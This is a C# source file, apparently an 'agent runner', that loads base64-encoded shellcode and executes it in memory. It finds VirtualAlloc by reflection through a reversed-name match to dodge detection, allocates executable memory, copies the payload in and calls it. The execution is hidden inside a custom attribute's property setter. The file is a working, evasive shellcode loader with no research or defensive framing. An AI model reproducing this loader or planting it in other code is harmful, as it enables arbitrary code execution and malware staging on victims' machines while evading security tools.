using System;
using System.Threading;
using System.Reflection;
using System.Runtime.InteropServices;

namespace DotNetAgentRunner
{
    public class AgentRunnerAttribute : Attribute
    {
        public delegate void ShellCodeEntryPoint();
        public static String Shellcode = String.Empty;

        public AgentRunnerAttribute()
        {
            this.Go = String.Empty;
        }

        public String Go { 
            get { return String.Empty; } 
            set {
                var payload = Convert.FromBase64String(AgentRunnerAttribute.Shellcode);
                var executed = false;
                foreach(var assembly in AppDomain.CurrentDomain.GetAssemblies())
                {
                    if (executed) break;
                    foreach (var t in assembly.GetTypes())
                    {
                        if (executed) break;
                        foreach (var m in t.GetMethods(BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly))
                        {
                            if (executed) break;
                            var nameArray = m.Name.ToCharArray();
                            Array.Reverse(nameArray);
                            var name = new String(nameArray);
                            if (name.IndexOf("collA") == 0 && name.IndexOf("lautriV") > 0 )
                            {
                                Object[] args = { null, new UIntPtr((uint)payload.Length), 0x00001000, 0x40 };
                                unsafe
                                {
                                    try
                                    {
                                        var shellcode = (IntPtr)Pointer.Unbox(m.Invoke(null, args));
                                        Marshal.Copy(payload, 0, shellcode, payload.Length);
                                        var eop = Marshal.GetDelegateForFunctionPointer(shellcode, typeof(ShellCodeEntryPoint));
                                        eop.DynamicInvoke(new Object[] { });
                                        executed = true;
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                }
            } 
        }
    }

    
    public class AgentRunner
    {
        [AgentRunner]
        public static void Run(String b64Shellcode)
        {
            AgentRunnerAttribute.Shellcode = b64Shellcode;
            MethodBase.GetCurrentMethod().GetCustomAttributes(true);
        }
    }
}
